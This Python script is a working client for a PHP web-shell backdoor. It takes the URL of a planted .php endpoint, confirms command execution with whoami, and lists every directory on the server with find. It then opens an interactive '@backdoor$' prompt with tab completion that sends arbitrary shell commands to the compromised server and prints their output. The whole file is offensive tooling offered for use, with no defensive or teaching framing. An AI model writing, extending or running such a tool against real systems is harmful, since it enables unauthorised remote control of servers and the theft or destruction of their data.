import requests
from colorama import init, Fore, Style  # Import colorama modules
from prompt_toolkit import prompt
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.formatted_text import HTML  # Import HTML for styling
from prompt_toolkit.history import InMemoryHistory  # For command history

# Initialize colorama
init(autoreset=True)

# Ask for the URL input before starting the shell
payloadurl = input(f"{Fore.YELLOW}Enter the URL with .php endpoint: ").strip()

# Function to get user info (whoami)
def whoami():
    try:
        r = requests.get(payloadurl, params={"cmd": "whoami"}, timeout=5)
        r.raise_for_status()
        print(f"{Fore.GREEN}Injected succesfully...")
        return r.text.strip()
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error fetching user info: {e}")
        return "unknown"
    

# Get the user info from the target URL
usr = whoami()

if usr == "unknown":
    print(f"{Fore.RED}Failed to retrieve user info. Check the URL.")
    # Ask for a valid URL again
    payloadurl = input(f"{Fore.YELLOW}Enter the URL with .php endpoint: ").strip()
    usr = whoami()
else:
    print(f"{Fore.CYAN}User info retrieved: {usr}")

# Function to fetch directories
def fetch_directories():
    try:
        # Use 'find' to get all directories, suppress errors
        r = requests.get(payloadurl, params={"cmd": "find / -type d 2>/dev/null"}, timeout=10)
        r.raise_for_status()
        dirs = r.text.strip().split('\n')
        return dirs
    except Exception as e:
        print(f"{Fore.RED}Failed to fetch directories: {e}")
        return []

# Fetch directories on connect
directories = fetch_directories()

# List of commands for tab-completion
commands = ['ls', 'pwd', 'whoami', 'cat', 'exit', 'quit', 'clear', 'help', 'sudo']

class PathCompleter(Completer):
    def __init__(self, commands, directories):
        self.commands = commands
        self.directories = directories

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        # Suggest commands if at start
        if not text or text.split()[0] not in self.commands:
            for cmd in self.commands:
                if cmd.startswith(text):
                    yield Completion(cmd, start_position=-len(text))
        # Suggest directories for path arguments
        else:
            parts = text.split()
            if len(parts) > 1:
                arg = parts[-1]
                for d in self.directories:
                    if d.startswith(arg):
                        yield Completion(d, start_position=-len(arg))

# Replace WordCompleter with PathCompleter
command_completer = PathCompleter(commands, directories)

# Initialize command history
history = InMemoryHistory()

# Main loop to take commands and execute them
while True:
    try:
        # Use HTML for styling the prompt and add history support
        cmd = prompt(
            HTML(f'<cyan>{usr}@backdoor$</cyan> '),
            completer=command_completer,
            history=history,  # Enable history here
            enable_history_search=True  # This makes sure you can use arrow keys to cycle through previous commands
        ).strip()

        if cmd.lower() in ["exit", "quit"]:
            print(f"{Fore.YELLOW}Exiting shell.")
            break

        if not cmd:
            print(f"{Fore.RED}Error: Command cannot be empty")
            continue
        
        r = requests.get(payloadurl, params={"cmd": cmd}, timeout=5)
        r.raise_for_status()
        output = r.text.strip()

        if not output:
            print(f"{Fore.RED}Error: No output or command failed")
        else:
            print(f"{Fore.GREEN}{output}")

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Session terminated by user.")
        break
    except Exception as e:
        print(f"{Fore.MAGENTA}Something broke: {e}")
